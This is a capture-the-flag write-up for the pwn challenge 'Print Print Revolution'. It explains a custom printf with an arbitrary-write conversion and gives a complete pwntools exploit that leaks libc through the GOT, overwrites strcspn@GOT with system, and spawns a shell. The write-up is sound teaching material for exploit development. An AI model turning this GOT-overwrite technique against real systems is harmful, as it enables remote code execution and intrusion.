---
title: "Print Print Revolution"
author: "s0g3king"
date: 2026-09-28
categories: ["Pwn", "SunshineCTF 2026"]
tags: ["format string", "got overwrite", "libc leak"]
partial_solve: false
used_ai: false
---

## Challenge

We are only given one binary called `revolution`, served at
`nc chal.sunshinectf.games 26002`.

## Recon

Checksec:

```text
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
RUNPATH:  b'$ORIGIN'
SHSTK:    Enabled
IBT:      Enabled
```

Decompiled source:

Trimmed the noisiest Ghidra artifacts (the `%p` hex-print loop and the varargs
register-save-area setup) and commented the branches that matter:

```c
// custom_printf(input): a hand-rolled printf run on the line you send after
// "score> ". Understands %%, %N$p / %N$x (leak), %N$s (read), %N$w (WRITE).
void custom_printf(char *input)
{
  char cVar1;
  char cVar3;
  char *pcVar4;
  undefined8 *puVar5;
  undefined8 uVar6;
  ulong uVar7;
  size_t __n;
  int iVar10;
  int iVar11;
  char *in_RDI;
  undefined4 *puVar12;
  bool bVar13;
  undefined4 local_100;
  undefined1 local_e8 [48];

  iVar10 = 0;
  local_100 = 8;                 // arg-walker state consumed by printf_helper (a hand-rolled va_list)
  cVar3 = *in_RDI;
  do {
    if (cVar3 == '\0') {
      return;
    }
    if (cVar3 == '%') {
      cVar3 = in_RDI[1];
      in_RDI = in_RDI + 1;
      if (cVar3 == '%') {
        write(1,"%",1);                                   // "%%" -> literal '%'
      }
      else {
        if (cVar3 == '\0') {
          return;
        }
        if ((byte)(cVar3 - 0x30U) < 10) {                 // %<digits>$<conv>: parse the arg index
          iVar11 = 0;
          do {
            pcVar4 = in_RDI;
            in_RDI = pcVar4 + 1;
            iVar11 = (int)(char)(cVar3 + -0x30) + iVar11 * 10;
            cVar3 = *in_RDI;
          } while ((byte)(cVar3 - 0x30U) < 10);
          if (cVar3 == '$') {
            cVar3 = pcVar4[2];                             // the conversion char
            in_RDI = pcVar4 + 2;
            cVar1 = cVar3 + -0x77;
            bVar13 = false;
            if (cVar3 == 'w') goto LAB_004014cd;           // %N$w -> arbitrary write
LAB_00401450:
            if (bVar13 || SBORROW1(cVar3,'w') != cVar1 < '\0') {
              if (cVar3 == 'p') {
LAB_00401540:
                uVar7 = printf_helper(&local_100,iVar11);  // %N$p / %N$x -> leak arg N
                // ... format uVar7 as "0x" + 16 hex digits and write() those 0x12 bytes
              }
              else {
                if (cVar3 != 's') goto LAB_00401524;
                pcVar4 = (char *)printf_helper(&local_100,iVar11);   // %N$s -> arg N as char*
                if (pcVar4 != (char *)0x0) {
                  __n = strlen(pcVar4);
                  write(1,pcVar4,__n);
                }
              }
            }
            else {
              if (cVar3 == 'x') goto LAB_00401540;
LAB_00401524:
              write(1,in_RDI,1);
            }
          }
        }
        else {                                            // bare %w (no index): auto-increment counter
          iVar10 = iVar10 + 1;
          cVar1 = cVar3 + -0x77;
          bVar13 = cVar1 == '\0';
          iVar11 = iVar10;
          if (!bVar13) goto LAB_00401450;
LAB_004014cd:
          puVar12 = &local_100;
          puVar5 = (undefined8 *)printf_helper(puVar12,iVar11);      // dst = arg[N]
          uVar6 = printf_helper(puVar12,iVar11 + 1);                 // val = arg[N+1]
          *puVar5 = uVar6;                                           // *dst = val
          write(1,"ok",2);
        }
      }
    }
    else {
      write(1,in_RDI,1);                                  // literal byte, copied out
    }
    cVar3 = in_RDI[1];
    in_RDI = in_RDI + 1;
  } while( true );
}
```

It is a bit messy, but essentially we have similar capabilities to `printf`.
We also have `%w`, which basically does `*argument[i] = argument[i+1]`, so
`argument[0] = address, argument[1] = value`.

This is a nice arbitrary write. And we also have arbitrary read from the basic
`printf` functionality (`%s` / `%p`) as well.

```python
def write64(p, addr, value):
    payload  = f"%{SLOT}$w".encode().ljust(8, b"\0")
    payload += p64(addr) + p64(value)
    return ask(p, payload) == b"ok"

def read64(p, addr):
    out = b""
    for i in range(8):
        payload = f"%{SLOT}$s".encode().ljust(8, b"\0") + p64(addr + i)
        b = ask(p, payload)
        out += b[:1] if b else b"\0"
    return u64(out)
```

This may require figuring out what version of `libc` is used on the remote. To
do this we leak a bunch of addresses and then compare them on databases online.
Since the binary has no PIE and Partial RELRO, we can use `custom_printf` to
leak GOT entries.

Using the `write` and `read` leaks I narrowed the `libc` down to
`glibc 2.39 (Ubuntu 24.04)`.

## Exploit

The reason `strcspn` is the target: after reading your line, `main` runs
`strcspn(input, ...)` on it (to find the newline) before looping back to the
prompt. So if we point `strcspn@GOT` at `system`, that call becomes
`system(input)` — and the next line we send is run as a shell command. Replace
the entry, then send `/bin/sh`.

Full exploit:

```python
#!/usr/bin/env python3
from pwn import *

elf  = context.binary = ELF("./revolution_patched")
libc = ELF("./libc.so.6")

IP, PORT = "chal.sunshinectf.games", 26002

def conn():
    return remote(IP, PORT) if args.REMOTE else process(elf.path)

SLOT   = 7
PROMPT = b"score> "

def ask(p, payload):
    p.sendlineafter(PROMPT, payload)
    out = p.recvuntil(PROMPT)
    p.unrecv(PROMPT)
    return out[:-len(PROMPT) - 1]

def read64(p, addr):
    out = b""
    for i in range(8):
        payload = f"%{SLOT}$s".encode().ljust(8, b"\0") + p64(addr + i)
        b = ask(p, payload)
        out += b[:1] if b else b"\0"
    return u64(out)

def write64(p, addr, value):
    payload  = f"%{SLOT}$w".encode().ljust(8, b"\0")
    payload += p64(addr) + p64(value)
    return ask(p, payload) == b"ok"

def main():
    p = conn()

    # leak libc via the write@GOT entry, then rebase
    write_leak   = read64(p, elf.got["write"])
    libc.address = write_leak - libc.symbols["write"]
    log.info(f"system: {hex(libc.sym.system)}")

    # strcspn@GOT -> system, so the next call becomes system("/bin/sh")
    write64(p, elf.got["strcspn"], libc.sym.system)

    p.sendline(b"/bin/sh")
    p.interactive()

if __name__ == "__main__":
    main()
```

This gives an interactive shell. The flag is in `flag.txt`.

